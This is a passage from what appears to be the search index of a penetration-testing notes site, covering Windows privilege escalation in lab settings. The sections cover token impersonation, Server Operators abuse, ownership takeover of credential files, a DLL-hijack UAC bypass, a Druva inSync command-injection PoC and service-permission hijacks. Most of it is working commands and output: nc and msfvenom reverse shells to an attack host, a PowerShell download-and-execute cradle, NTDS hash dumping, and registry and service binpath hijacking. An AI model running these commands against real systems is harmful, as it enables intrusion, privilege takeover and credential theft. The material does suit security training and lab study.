\"c:\\tools\\nc.exe 10.10.14.3 8443 -e cmd\"\n\noutput                                                                             \n\n--------------------------------------------------------------------------------   \n\n[+] Found privilege: SeImpersonatePrivilege                                        \n\n[+] Named pipe listening...                                                        \n\n[+] CreateProcessAsUser() OK                                                       \n\nNULL \n</code></pre> <p>Catching Shell</p> <pre><code>secops@kali[/kali]$ nc -lnvp 8443\n\nlistening on [any] 8443 ...\nconnect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847\nMicrosoft Windows [Version 10.0.14393]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\n\nC:\\Windows\\system32&gt;whoami\n\nwhoami\nnt authority\\system\n</code></pre>","title":"SeImpersonate and SeAssignPrimaryToken"},{"location":"privesc/windows/server_operators/","text":"<p>Examine the <code>AppReadiness</code> service. We can confirm that this service starts as SYSTEM using the <code>sc.exe</code> utility.</p> <pre><code>C:\\xyz&gt; sc qc AppReadiness\n\n[SC] QueryServiceConfig SUCCESS\n\nSERVICE_NAME: AppReadiness\n        TYPE               : 20  WIN32_SHARE_PROCESS\n        START_TYPE         : 3   DEMAND_START\n        ERROR_CONTROL      : 1   NORMAL\n        BINARY_PATH_NAME   : C:\\Windows\\System32\\svchost.exe -k AppReadiness -p\n        LOAD_ORDER_GROUP   :\n        TAG                : 0\n        DISPLAY_NAME       : App Readiness\n        DEPENDENCIES       :\n        SERVICE_START_NAME : LocalSystem\n</code></pre> <p>We can use the service viewer/controller PsService, which is part of the Sysinternals suite, to check permissions on the service. <code>PsService</code> works much like the <code>sc</code> utility and can display service status and configurations and also allow you to start, stop, pause, resume, and restart services both locally and on remote hosts.</p> <pre><code>C:\\xyz&gt; c:\\Tools\\PsService.exe security AppReadiness\n\nPsService v2.25 - Service information and configuration utility\nCopyright (C) 2001-2010 Mark Russinovich\nSysinternals - www.sysinternals.com\n\nSERVICE_NAME: AppReadiness\nDISPLAY_NAME: App Readiness\n        ACCOUNT: LocalSystem\n        SECURITY:\n        [ALLOW] NT AUTHORITY\\SYSTEM\n                Query status\n                Query Config\n                Interrogate\n                Enumerate Dependents\n                Pause/Resume\n                Start\n                Stop\n                User-Defined Control\n                Read Permissions\n        [ALLOW] BUILTIN\\Administrators\n                All\n        [ALLOW] NT AUTHORITY\\INTERACTIVE\n                Query status\n                Query Config\n                Interrogate\n                Enumerate Dependents\n                User-Defined Control\n                Read Permissions\n        [ALLOW] NT AUTHORITY\\SERVICE\n                Query status\n                Query Config\n                Interrogate\n                Enumerate Dependents\n                User-Defined Control\n                Read Permissions\n        [ALLOW] BUILTIN\\Server Operators\n                All\n</code></pre> <p>This confirms that the Server Operators group has SERVICE_ALL_ACCESS access right, which gives us full control over this service.</p> <p>Look at the current members of the local administrators group, confirms that our target account is not present. <pre><code>C:\\xyz&gt; net localgroup Administrators\n\nAlias name     Administrators\nComment        Administrators have complete and unrestricted access to the computer/domain\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator\nDomain Admins\nEnterprise Admins\nThe command completed successfully.\n</code></pre></p> <p>Change the binary path to execute a command which adds our current user to the default local administrators group. <pre><code>C:\\xyz&gt; sc config AppReadiness binPath= \"cmd /c net localgroup Administrators server_adm /add\"\n\n[SC] ChangeServiceConfig SUCCESS\n</code></pre></p> <p>Starting the service fails, which is expected. <pre><code>C:\\xyz&gt; sc start AppReadiness\n\n[SC] StartService FAILED 1053:\n\nThe service did not respond to the start or control request in a timely fashion.\n</code></pre></p> <p>If we check the membership of the administrators group, we see that the command was executed successfully. <pre><code>C:\\xyz&gt; net localgroup Administrators\n\nAlias name     Administrators\nComment        Administrators have complete and unrestricted access to the computer/domain\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator\nDomain Admins\nEnterprise Admins\nserver_adm\nThe command completed successfully.\n</code></pre></p> <p>From here, we have full control over the Domain Controller and could retrieve all credentials from the NTDS database and access other systems, and perform post-exploitation tasks. <pre><code>secops@kali[/kali]$ crackmapexec smb 10.129.43.9 -u server_adm -p '**************'\n\nSMB         10.129.43.9     445    WINLPE-DC01      [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:legalcorp.local) (signing:True) (SMBv1:False)\nSMB         10.129.43.9     445    WINLPE-DC01      [+] legalcorp.local\\server_adm:********** (Pwn3d!)\n</code></pre></p> <p>Retrieving NTLM Password Hashes from the Domain Controller <pre><code>secops@kali[/kali]$ secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator\n\nImpacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation\n\nPassword:\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::\n[*] Kerberos keys grabbed\nAdministrator:aes256-cts-hmac-sha1-96:5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43\nAdministrator:aes128-cts-hmac-sha1-96:94c300d0e47775b407f2496a5cca1a0a\nAdministrator:des-cbc-md5:d60dfbbf20548938\n[*] Cleaning up...\n</code></pre></p>","title":"Server Operators"},{"location":"privesc/windows/setakeownershippriv/","text":"<p>SeTakeOwnershipPrivilege grants a user the ability to take ownership of any \"securable object,\" meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. This privilege assigns WRITE_OWNER rights over an object, meaning the user can change the owner within the object's security descriptor. </p> <p>The setting can be set in Group Policy under:</p> <pre><code>Computer Configuration \u21fe Windows Settings \u21fe Security Settings \u21fe Local Policies \u21fe User Rights Assignment\n</code></pre> <p>Review current user privileges <pre><code>PS C:\\xyz&gt; whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                                              State\n============================= ======================================================= ========\nSeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking                                Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled\n</code></pre></p> <p>The privilege is not enabled. We can enable it using this script.</p> <pre><code>PS C:\\xyz&gt; Import-Module .\\Enable-Privilege.ps1\nPS C:\\xyz&gt; .\\EnableAllTokenPrivs.ps1\nPS C:\\xyz&gt; whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\nPrivilege Name                Description                              State\n============================= ======================================== =======\nSeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking                 Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set           Enabled\n</code></pre> <p>Check out target file, to gather more info about it</p> <pre><code>PS C:\\xyz&gt; Get-ChildItem -Path 'C:\\Department Shares\\Private\\IT\\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name=\"Owner\";Expression={ (Get-Acl $_.FullName).Owner }}\n\nFullName                                 LastWriteTime         Attributes Owner\n--------                                 -------------         ---------- -----\nC:\\Department Shares\\Private\\IT\\cred.txt 6/18/2021 12:23:28 PM    Archive\n</code></pre> <p>Owner is not shown, meaning that we likely do not have enough permissions over the object to view those details.</p> <pre><code>PS C:\\xyz&gt; cmd /c dir /q 'C:\\Department Shares\\Private\\IT'\n\n Volume in drive C has no label.\n Volume Serial Number is 0C92-675B\n\n Directory of C:\\Department Shares\\Private\\IT\n\n06/18/2021  12:22 PM    &lt;DIR&gt;          WINLPE-SRV01\\sccm_svc  .\n06/18/2021  12:22 PM    &lt;DIR&gt;          WINLPE-SRV01\\sccm_svc  ..\n06/18/2021  12:23 PM                36 ...                    cred.txt\n               1 File(s)             36 bytes\n               2 Dir(s)  17,079,754,752 bytes free\n</code></pre> <p>IT share appears to be owned by a service account</p> <p>Use the takedown Windows binary to change the ownership of the file</p> <pre><code>PS C:\\xyz&gt; takeown /f 'C:\\Department Shares\\Private\\IT\\cred.txt'\n\nSUCCESS: The file (or folder): \"C:\\Department Shares\\Private\\IT\\cred.txt\" now owned by user \"WINLPE-SRV01\\user\".\n</code></pre> <p>Confirm ownership</p> <pre><code>PS C:\\xyz&gt; Get-ChildItem -Path 'C:\\Department Shares\\Private\\IT\\cred.txt' | select name,directory, @{Name=\"Owner\";Expression={(Get-ACL $_.Fullname).Owner}}\n\nName     Directory                       Owner\n----     ---------                       -----\ncred.txt C:\\Department Shares\\Private\\IT WINLPE-SRV01\\user\n</code></pre> <p>May still not be able to read the file and need to modify the file ACL using icacls to be able to read it.</p> <pre><code>PS C:\\xyz&gt; cat 'C:\\Department Shares\\Private\\IT\\cred.txt'\n\ncat : Access to the path 'C:\\Department Shares\\Private\\IT\\cred.txt' is denied.\nAt line:1 char:1\n+ cat 'C:\\Department Shares\\Private\\IT\\cred.txt'\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : PermissionDenied: (C:\\Department Shares\\Private\\IT\\cred.txt:String) [Get-Content], Unaut\n   horizedAccessException\n    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand\n</code></pre> <p>Grant our user full privileges over the target file.</p> <pre><code>PS C:\\xyz&gt; icacls 'C:\\Department Shares\\Private\\IT\\cred.txt' /grant user:F\n\nprocessed file: C:\\Department Shares\\Private\\IT\\cred.txt\nSuccessfully processed 1 files; Failed processing 0 files\n</code></pre> <p>Now read the file <pre><code>PS C:\\xyz&gt; cat 'C:\\Department Shares\\Private\\IT\\cred.txt'\n\nNIX01 admin\n\nroot:n1X_p0wer_us3er!\n</code></pre></p> <p>After performing these changes, make every effort to revert the permissions/file ownership.</p>  <p>When to use? Files of Interest:</p> <pre><code>c:\\inetpub\\wwwwroot\\web.config\n%WINDIR%\\repair\\sam\n%WINDIR%\\repair\\system\n%WINDIR%\\repair\\software, %WINDIR%\\repair\\security\n%WINDIR%\\system32\\config\\SecEvent.Evt\n%WINDIR%\\system32\\config\\default.sav\n%WINDIR%\\system32\\config\\security.sav\n%WINDIR%\\system32\\config\\software.sav\n%WINDIR%\\system32\\config\\system.sav\n</code></pre> <p>Also .kdbx KeePass db files, OneNote notebooks, files such as <code>password.*, pass.*, cred.*</code></p>","title":"SeTakeOwnershipPrivilege"},{"location":"privesc/windows/user_account_control/","text":"<p>UAC should be enabled, and although it may not stop an attacker from gaining privileges, it is an extra step that may slow this process down and force them to become noisier.</p> <p>Checking Current User <pre><code>C:\\xyz&gt; whoami /user\n\nUSER INFORMATION\n----------------\n\nUser Name         SID\n================= ==============================================\nwinlpe-ws03\\sarah S-1-5-21-3159276091-2191180989-3781274054-1002\n</code></pre></p> <p>Confirming Admin Group Membership <pre><code>C:\\xyz&gt; net localgroup administrators\n\nAlias name     administrators\nComment        Administrators have complete and unrestricted access to the computer/domain\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator\nmrb0b\nsarah\nThe command completed successfully.\n</code></pre></p> <p>Reviewing User Privileges <pre><code>C:\\xyz&gt; whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                          State\n============================= ==================================== ========\nSeShutdownPrivilege           Shut down the system                 Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking             Enabled\nSeUndockPrivilege             Remove computer from docking station Disabled\nSeIncreaseWorkingSetPrivilege Increase a process working set       Disabled\nSeTimeZonePrivilege           Change the time zone                 Disabled\n</code></pre></p> <p>Confirming UAC is Enabled <pre><code>C:\\xyz&gt; REG QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v EnableLUA\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\n    EnableLUA    REG_DWORD    0x1\n</code></pre></p> <p>Checking UAC Level <pre><code>C:\\xyz&gt; REG QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v ConsentPromptBehaviorAdmin\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\n    ConsentPromptBehaviorAdmin    REG_DWORD    0x5\n</code></pre></p> <p>The value of <code>ConsentPromptBehaviorAdmin</code> is <code>0x5</code>, which means the highest UAC level of Always notify is enabled. There are fewer UAC bypasses at this highest level.</p> <p>Checking Windows Version <pre><code>PS C:\\xyz&gt; [environment]::OSVersion.Version\n\nMajor  Minor  Build  Revision\n-----  -----  -----  --------\n10     0      14393  0\n</code></pre></p> <p>Build version 14393, which using this page we cross-reference to Windows release 1607.</p> <p>The UACME project maintains a list of UAC bypasses, including information on the affected Windows build number, the technique used, and if Microsoft has issued a security update to fix it. Let's use technique number 54, which is stated to work from Windows 10 build 14393. This technique targets the 32-bit version of the auto-elevating binary SystemPropertiesAdvanced.exe. There are many trusted binaries that Windows will allow to auto-elevate without the need for a UAC consent prompt.</p> <p>The 32-bit version of SystemPropertiesAdvanced.exe attempts to load the non-existent DLL srrstr.dll, which is used by System Restore functionality.</p> <p>When attempting to locate a DLL, Windows will use the following search order:</p> <ol> <li>The directory from which the application loaded.</li> <li>The system directory <code>C:\\Windows\\System32</code> for 64-bit systems.</li> <li>The 16-bit system directory <code>C:\\Windows\\System</code> (not supported on 64-bit systems)</li> <li>The Windows directory.</li> <li>Any directories that are listed in the PATH environment variable.</li> </ol> <p>Reviewing Path Variable. The WindowsApps folder is within the user's profile and writable by the user.</p> <pre><code>PS C:\\xyz&gt; cmd /c echo %PATH%\n\nC:\\Windows\\system32;\nC:\\Windows;\nC:\\Windows\\System32\\Wbem;\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;\nC:\\Users\\sarah\\AppData\\Local\\Microsoft\\WindowsApps;\n</code></pre> <p>We can potentially bypass UAC in this by using DLL hijacking by placing a malicious <code>srrstr.dll</code> DLL to <code>WindowsApps</code> folder, which will be loaded in an elevated context.</p> <p>Generating Malicious srrstr.dll DLL <pre><code>secops@kali[/kali]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll &gt; srrstr.dll\n\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 324 bytes\nFinal size of dll file: 5120 bytes\n</code></pre></p> <pre><code>secops@kali[/kali]$ sudo python3 -m http.server 8080\n</code></pre> <p>Starting nc Listener on Attack Host <pre><code>secops@kali[/kali]$ nc -lvnp 8443\n</code></pre></p> <p>If we execute the malicious <code>srrstr.dll</code> file, we will receive a shell back showing normal user rights (UAC enabled). To test this, we can run the DLL using <code>rundll32.exe</code> to get a reverse shell connection.</p> <pre><code>C:\\xyz&gt; rundll32 shell32.dll,Control_RunDLL C:\\Users\\sarah\\AppData\\Local\\Microsoft\\WindowsApps\\srrstr.dll\n</code></pre> <p>Once we get a connection back, we'll see normal user rights. <pre><code>secops@kali[/kali]$ nc -lnvp 8443\n\nlistening on [any] 8443 ...\n\nconnect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 49789\nMicrosoft Windows [Version 10.0.14393]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\n\nC:\\Users\\sarah&gt; whoami /priv\n\nwhoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                          State   \n============================= ==================================== ========\nSeShutdownPrivilege           Shut down the system                 Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking             Enabled \nSeUndockPrivilege             Remove computer from docking station Disabled\nSeIncreaseWorkingSetPrivilege Increase a process working set       Disabled\nSeTimeZonePrivilege           Change the time zone                 Disabled\n</code></pre></p> <p>Now, we can execute the 32-bit version of SystemPropertiesAdvanced.exe from the target host. <pre><code>C:\\xyz&gt; C:\\Windows\\SysWOW64\\SystemPropertiesAdvanced.exe\n</code></pre></p> <p>Checking back on our listener, we should receive a connection almost instantly. <pre><code>secops@kali[/kali]$ nc -lvnp 8443\n\nlistening on [any] 8443 ...\nconnect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 50273\nMicrosoft Windows [Version 10.0.14393]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;whoami\n\nwhoami\nwinlpe-ws03\\sarah\n\n\nC:\\Windows\\system32&gt;whoami /priv\n\nwhoami /priv\nPRIVILEGES INFORMATION\n----------------------\nPrivilege Name                            Description                                                        State\n========================================= ================================================================== ========\nSeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled\nSeSecurityPrivilege                       Manage auditing and security log                                   Disabled\nSeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled\nSeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled\nSeSystemProfilePrivilege                  Profile system performance                                         Disabled\nSeSystemtimePrivilege                     Change the system time                                             Disabled\nSeProfileSingleProcessPrivilege           Profile single process                                             Disabled\nSeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled\nSeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled\nSeBackupPrivilege                         Back up files and directories                                      Disabled\nSeRestorePrivilege                        Restore files and directories                                      Disabled\nSeShutdownPrivilege                       Shut down the system                                               Disabled\nSeDebugPrivilege                          Debug programs                                                     Disabled\nSeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled\nSeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled\nSeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled\nSeUndockPrivilege                         Remove computer from docking station                               Disabled\nSeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled\nSeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled\nSeCreateGlobalPrivilege                   Create global objects                                              Enabled\nSeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled\nSeTimeZonePrivilege                       Change the time zone                                               Disabled\nSeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled\nSeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled\n</code></pre></p>","title":"User Account Control"},{"location":"privesc/windows/vulnerable_services/","text":"<pre><code>C:\\xyz&gt; wmic product get name\n\nName\nMicrosoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910\nUpdate for Windows 10 for x64-based Systems (KB4023057)\nMicrosoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127\nVMware Tools\nDruva inSync 6.6.3\nMicrosoft Update Health Tools\nMicrosoft Visual C++ 2019 X64 Additional Runtime - 14.28.29910\nUpdate for Windows 10 for x64-based Systems (KB4480730)\nMicrosoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127\n</code></pre> <p>The <code>Druva inSync</code> application stands out. A quick Google search shows that version <code>6.6.3</code> is vulnerable to a command injection attack via an exposed RPC service. We may be able to use this exploit PoC to escalate our privileges.</p> <p>Further enumeration to confirm that the service is running as expected: <pre><code>C:\\xyz&gt; netstat -ano | findstr 6064\n\n  TCP    127.0.0.1:6064         0.0.0.0:0              LISTENING       3324\n  TCP    127.0.0.1:6064         127.0.0.1:50274        ESTABLISHED     3324\n  TCP    127.0.0.1:6064         127.0.0.1:50510        TIME_WAIT       0\n  TCP    127.0.0.1:6064         127.0.0.1:50511        TIME_WAIT       0\n  TCP    127.0.0.1:50274        127.0.0.1:6064         ESTABLISHED     3860\n</code></pre></p> <p>Enumerating Process ID <pre><code>PS C:\\xyz&gt; get-process -Id 3324\n\nHandles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName\n-------  ------    -----      -----     ------     --  -- -----------\n    149      10     1512       6748              3324   0 inSyncCPHwnet64\n</code></pre></p> <pre><code>PS C:\\xyz&gt; get-service | ? {$_.DisplayName -like 'Druva*'}\n\nStatus   Name               DisplayName\n------   ----               -----------\nRunning  inSyncCPHService   Druva inSync Client Service\n</code></pre> <p>With this information in hand, let's try out the exploit PoC, which is this short PowerShell snippet. <pre><code>$ErrorActionPreference = \"Stop\"\n\n$cmd = \"net user pwnd /add\"\n\n$s = New-Object System.Net.Sockets.Socket(\n    [System.Net.Sockets.AddressFamily]::InterNetwork,\n    [System.Net.Sockets.SocketType]::Stream,\n    [System.Net.Sockets.ProtocolType]::Tcp\n)\n$s.Connect(\"127.0.0.1\", 6064)\n\n$header = [System.Text.Encoding]::UTF8.GetBytes(\"inSync PHC RPCW[v0002]\")\n$rpcType = [System.Text.Encoding]::UTF8.GetBytes(\"$([char]0x0005)`0`0`0\")\n$command = [System.Text.Encoding]::Unicode.GetBytes(\"C:\\ProgramData\\Druva\\inSync4\\..\\..\\..\\Windows\\System32\\cmd.exe /c $cmd\");\n$length = [System.BitConverter]::GetBytes($command.Length);\n\n$s.Send($header)\n$s.Send($rpcType)\n$s.Send($length)\n$s.Send($command)\n</code></pre></p> <p>For our purposes, we want to modify the <code>$cmd</code> variable to our desired command. Let's try this with Invoke-PowerShellTcp.ps1.</p> <pre><code>Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443\n</code></pre> <p>Modify the $cmd variable in the Druva inSync exploit PoC script to download our PowerShell reverse shell into memory. <pre><code>$cmd = \"powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.4:8080/shell.ps1')\"\n</code></pre></p> <p>Start a Python web server in the same directory as <code>script.ps1</code> script <pre><code>secops@kali[/kali]$ python3 -m http.server 8080\n</code></pre></p> <p>Start a listener on the attack box and execute the PoC PowerShell script on the target host (after modifying the PowerShell execution policy with a command such as <code>Set-ExecutionPolicy Bypass -Scope Process</code>)</p> <pre><code>secops@kali[/kali]$ nc -lvnp 9443\n\nlistening on [any] 9443 ...\nconnect to [10.10.14.3] from (UNKNOWN) [10.129.43.7] 58611\nWindows PowerShell running as user WINLPE-WS01$ on WINLPE-WS01\nCopyright (C) 2015 Microsoft Corporation. All rights reserved.\n\n\nPS C:\\WINDOWS\\system32&gt;whoami\n\nnt authority\\system\n\n\nPS C:\\WINDOWS\\system32&gt; hostname\n\nWINLPE-WS01\n</code></pre>","title":"Vulnerable Services"},{"location":"privesc/windows/weak_permissions/","text":"<p>We can use SharpUp from the GhostPack suite of tools to check for service binaries suffering from weak ACLs.</p> <pre><code>PS C:\\xyz&gt; .\\SharpUp.exe audit\n\n=== SharpUp: Running Privilege Escalation Checks ===\n\n\n=== Modifiable Service Binaries ===\n\n  Name             : SecurityService\n  DisplayName      : PC Security Management Service\n  Description      : Responsible for managing PC security\n  State            : Stopped\n  StartMode        : Auto\n  PathName         : \"C:\\Program Files (x86)\\PCProtect\\SecurityService.exe\"\n\n  &lt;SNIP&gt;\n</code></pre> <p>The tool identifies the <code>PC Security Management Service</code>, which executes the <code>SecurityService.exe</code> binary when started.</p> <p>Using icacls we can verify the vulnerability and see that the EVERYONE and BUILTIN\\Users groups have been granted full permissions to the directory, and therefore any unprivileged system user can manipulate the directory and its contents.</p> <pre><code>PS C:\\xyz&gt; icacls \"C:\\Program Files (x86)\\PCProtect\\SecurityService.exe\"\n\nC:\\Program Files (x86)\\PCProtect\\SecurityService.exe BUILTIN\\Users:(I)(F)\n                                                     Everyone:(I)(F)\n                                                     NT AUTHORITY\\SYSTEM:(I)(F)\n                                                     BUILTIN\\Administrators:(I)(F)\n                                                     APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX)\n                                                     APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)\n\nSuccessfully processed 1 files; Failed processing 0 files\n</code></pre> <p>This service is also startable by unprivileged users, so we can make a backup of the original binary and replace it with a malicious binary generated with msfvenom. It can give us a reverse shell as SYSTEM, or add a local admin user and give us full administrative control over the machine.</p> <pre><code>C:\\xyz&gt; cmd /c copy /Y SecurityService.exe \"C:\\Program Files (x86)\\PCProtect\\SecurityService.exe\"\nC:\\xyz&gt; sc start SecurityService\n</code></pre>  <p>Check the SharpUp output again for any modifiable services. We see the WindscribeService is potentially misconfigured.</p> <pre><code>C:\\xyz&gt; SharpUp.exe audit\n\n=== SharpUp: Running Privilege Escalation Checks ===\n\n\n=== Modifiable Services ===\n\n  Name             : WindscribeService\n  DisplayName      : WindscribeService\n  Description      : Manages the firewall and controls the VPN tunnel\n  State            : Running\n  StartMode        : Auto\n  PathName         : \"C:\\Program Files (x86)\\Windscribe\\WindscribeService.exe\"\n</code></pre> <p>We can use AccessChk from the Sysinternals suite to enumerate permissions on the service. Flags: <code>-q</code> (omit banner), <code>-u</code> (suppress errors), <code>-v</code> (verbose), <code>-c</code> (specify name of a Windows service), and <code>-w</code> (show only objects that have write access). We can see that all Authenticated Users have SERVICE_ALL_ACCESS rights over the service, which means full read/write control over it.</p> <pre><code>C:\\xyz&gt; accesschk.exe /accepteula -quvcw WindscribeService\n\nAccesschk v6.13 - Reports effective permissions for securable objects\nCopyright \u2310 2006-2020 Mark Russinovich\nSysinternals - www.sysinternals.com\n\nWindscribeService\n  Medium Mandatory Level (Default) [No-Write-Up]\n  RW NT AUTHORITY\\SYSTEM\n        SERVICE_ALL_ACCESS\n  RW BUILTIN\\Administrators\n        SERVICE_ALL_ACCESS\n  RW NT AUTHORITY\\Authenticated Users\n        SERVICE_ALL_ACCESS\n</code></pre> <p>Checking the local administrators group confirms that our user is not a member.</p> <pre><code>C:\\xyz&gt; net localgroup administrators\n\nAlias name     administrators\nComment        Administrators have complete and unrestricted access to the computer/domain\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator\nmrb0b\nThe command completed successfully.\n</code></pre> <p>We can use our permissions to change the binary path maliciously. Let's change it to add our user to the local administrator group. We could set the binary path to run any command or executable of our choosing (such as a reverse shell binary).</p> <pre><code>C:\\xyz&gt; sc config WindscribeService binpath=\"cmd /c net localgroup administrators user /add\"\n\n[SC] ChangeServiceConfig SUCCESS\n</code></pre> <p>Next, we must stop the service, so the new binpath command will run the next time it is started.</p> <pre><code>C:\\xyz&gt; sc stop WindscribeService\n\nSERVICE_NAME: WindscribeService\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 3  STOP_PENDING\n                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x4\n        WAIT_HINT          : 0x0\n</code></pre> <p>Since we have full control over the service, we can start it again, and the command we placed in the binpath will run even though an error message is returned. The service fails to start because the binpath is not pointing to the actual service executable. Still, the executable will run when the system attempts to start the service before erroring out and stopping the service again, executing whatever command we specify in the binpath.</p> <pre><code>C:\\xyz&gt; sc start WindscribeService\n\n[SC] StartService FAILED 1053:\n\nThe service did not respond to the start or control request in a timely fashion.\n</code></pre> <p>Check to confirm that our user was added to the local administrators group.</p> <pre><code>C:\\xyz&gt; net localgroup administrators\n\nAlias name     administrators\nComment        Administrators have complete and unrestricted access to the computer/domain\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator\nuser\nmrb0b\nThe command completed successfully.\n</code></pre>  <p>Cleanup Reverting the Binary Path <pre><code>C:\\xyz&gt; sc config WindScribeService binpath=\"c:\\Program Files (x86)\\Windscribe\\WindscribeService.exe\"\n\n[SC] ChangeServiceConfig SUCCESS\n</code></pre></p> <p>If all goes to plan, we can start the service again without an issue. <pre><code>C:\\xyz&gt; sc start WindScribeService\n\nSERVICE_NAME: WindScribeService\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 2  START_PENDING\n                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x0\n        WAIT_HINT          : 0x0\n        PID                : 1716\n        FLAGS              :\n</code></pre></p> <p>Verifying Service is Running <pre><code>C:\\xyz&gt; sc query WindScribeService\n\nSERVICE_NAME: WindScribeService\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 4  Running\n                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x0\n        WAIT_HINT          : 0x0\n</code></pre></p>  <p>Searching for Unquoted Service Paths We can identify unquoted service binary paths: <pre><code>C:\\xyz&gt; wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v \"\"\"\nGVFS.Service                                                                        GVFS.Service                              C:\\Program Files\\GVFS\\GVFS.Service.exe                                                 Auto\nSystem Explorer Service                                                             SystemExplorerHelpService                 C:\\Program Files (x86)\\System Explorer\\service\\SystemExplorerService64.exe             Auto\nWindscribeService                                                                   WindscribeService                         C:\\Program Files (x86)\\Windscribe\\WindscribeService.exe                                  Auto\n</code></pre></p>  <p>It is also worth searching for weak service ACLs in the Windows Registry. <pre><code>C:\\xyz&gt; accesschk.exe /accepteula \"mrb0b\" -kvuqsw hklm\\System\\CurrentControlSet\\services\n\nAccesschk v6.13 - Reports effective permissions for securable objects\nCopyright \u2310 2006-2020 Mark Russinovich\nSysinternals - www.sysinternals.com\n\nRW HKLM\\System\\CurrentControlSet\\services\\ModelManagerService\n        KEY_ALL_ACCESS\n\n&lt;SNIP&gt;\n</code></pre></p> <p>Changing ImagePath with PowerShell</p> <p>We can abuse this using the PowerShell cmdlet Set-ItemProperty to change the ImagePath value, using a command such as: <pre><code>PS C:\\xyz&gt; Set-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ModelManagerService -Name \"ImagePath\" -Value \"C:\\Users\\john\\Downloads\\nc.exe -e cmd.exe 10.10.10.205 443\"\n</code></pre></p>  <p>Modifiable Registry Autorun Binary Check Startup Programs</p> <p>We can use WMIC to see what programs run at system startup. Suppose we have write permissions to the registry for a given binary or can 